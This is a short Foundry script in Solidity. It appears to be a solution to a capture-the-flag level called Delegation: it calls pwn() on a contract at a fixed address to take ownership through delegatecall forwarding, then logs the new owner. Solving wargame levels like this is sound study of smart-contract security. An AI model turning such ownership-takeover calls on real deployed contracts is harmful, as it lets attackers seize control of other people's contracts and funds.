// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationScript is Script {
    Delegation public delegation;

    function setUp() public {
        delegation = Delegation(0x1975Ee25B8418b7Ed6Ebb4B992931790B847e794);
    }

    function run() public {
        vm.startBroadcast();

        (bool result,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("result %d, delegation owner %s", result, delegation.owner());

        vm.stopBroadcast();
    }
}